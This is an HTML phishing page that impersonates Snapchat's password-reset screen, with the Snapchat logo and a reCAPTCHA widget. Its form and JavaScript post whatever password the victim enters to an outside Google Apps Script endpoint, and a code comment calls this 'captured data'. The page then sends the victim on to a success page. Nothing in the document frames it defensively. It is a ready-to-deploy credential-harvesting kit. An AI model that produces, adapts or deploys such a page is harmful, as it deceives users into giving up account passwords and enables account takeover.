<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Reset Password - Snapchat Password Reset</title>
    <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
    <style>
        .error-message {
            color: red;
            margin-top: 5px;
            font-size: 14px;
        }
    </style>
    <!-- Google reCAPTCHA -->
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
    <div class="form">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
        <h1>Reset Your Password</h1>
        <form id="passwordResetForm" action="https://script.google.com/macros/s/AKfycbwSoa7IFpuGWp2zCoMKhQcTT4T5Wblked6fNgiZCpTiR18Ke96hthAZoRlKYsrkIyE/exec" method="post">
            <label for="new_password">New Password:</label><br>
            <input type="password" id="new_password" name="new_password" placeholder="Enter your new password" required><br><br>
            
            <!-- Google reCAPTCHA -->
            <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
            <span id="captchaError" class="error-message"></span><br>
            
            <input type="submit" value="Reset Password">
        </form>
    </div>
    
    <script>
        document.getElementById('passwordResetForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            
            var newPassword = document.getElementById('new_password').value;
            var recaptchaResponse = grecaptcha.getResponse();
            
            // Validate reCAPTCHA
            if (!recaptchaResponse) {
                document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
                return;
            }
            
            // Send captured data to server (Google Apps Script endpoint)
            storeNewPassword(newPassword);
        });
        
        function storeNewPassword(newPassword) {
            var url = "https://script.google.com/macros/s/AKfycbwSoa7IFpuGWp2zCoMKhQcTT4T5Wblked6fNgiZCpTiR18Ke96hthAZoRlKYsrkIyE/exec"; // Update with your deployed Google Apps Script URL
            
            // Prepare data to send
            var formData = new FormData();
            formData.append("new_password", newPassword);
            
            // Send data using fetch API
            fetch(url, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // No-cors mode because of cross-origin issues
            })
            .then(response => {
                if (response.ok) {
                    console.log("Password reset successful");
                    window.location.href = "success.html"; // Redirect to success page
                } else {
                    console.error("Error submitting new password");
                    // Handle error (optional)
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // Handle network error (optional)
            });
        }
    </script>
</body>
</html>
